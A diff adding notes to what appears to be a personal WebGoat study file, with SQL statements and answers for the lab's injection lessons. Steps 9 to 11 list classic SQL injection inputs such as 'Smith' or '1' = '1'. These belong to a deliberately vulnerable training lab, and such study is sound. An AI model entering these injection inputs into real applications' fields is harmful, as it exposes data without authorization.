@@ -35,6 +35,53 @@ Symmetric - Misma llave
 
 
  Asymmetric - llave publica llave privada
+ 
+# A1 Injection
+
+## Intro
+
+### 2
+
+```SQL
+select employees.department from employees where first_name = 'Bob' and last_name = 'Franco';
+```
+### 3
+
+```SQL
+UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' and last_name = 'Barnett';
+```
+### 4
+
+```SQL
+ALTER TABLE employees ADD phone varchar(20);
+```
+### 5
+
+```SQL
+GRANT ALTER TABLE to 'UnauthorizedUser';
+```
+### 9
+
+```
+Smith'
+or 
+'1' = '1 
+```
+
+### 10
+
+```
+1
+'1' or true = true
+```
+
+### 11
+
+```
+1
+'1' or true = true
+```
+
 
 ## Access control flaws -  Guessing & Predicting Patterns
 
